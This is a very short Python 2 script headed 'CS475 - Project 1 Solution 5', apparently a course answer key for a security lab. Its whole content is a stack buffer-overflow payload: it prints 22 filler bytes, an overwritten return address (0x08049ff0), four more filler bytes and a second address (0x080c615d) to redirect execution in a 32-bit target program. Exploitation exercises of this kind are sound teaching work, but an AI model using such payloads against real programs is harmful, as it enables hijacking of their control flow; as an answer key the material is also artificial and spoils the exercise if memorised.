#/usr/bin/python
#CS475 - Project 1 Solution 5
#
from struct import pack

print 'a'*22+pack("<I",0x08049ff0)+'a'*4+pack("<I",0x080c615d)
